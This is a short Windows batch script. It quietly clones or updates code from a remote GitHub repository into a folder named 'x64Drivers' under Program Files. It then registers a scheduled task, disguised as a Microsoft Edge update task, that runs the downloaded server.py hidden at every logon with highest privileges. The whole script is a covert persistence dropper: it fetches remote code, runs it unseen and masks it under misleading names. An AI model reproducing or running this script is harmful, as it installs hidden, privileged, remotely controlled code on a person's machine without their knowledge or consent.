@echo off

set "TARGET_DIR=C:\Program Files\x64Drivers"

set "REPO_URL=https://github.com/z7x8c9/Web-Mouse.git"

set "FILE=%TARGET_DIR%\server.py"

if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"

cd "%TARGET_DIR%"
if exist ".git" (
    git pull origin master >nul 2>&1
) else (
    git clone %REPO_URL% . >nul 2>&1
)

schtasks.exe /Create /TN MicrosoftEdgeUpdateTaskMachineMain /TR "cmd /c start /MIN pythonw.exe %FILE%" /F /RL HIGHEST /SC ONLOGON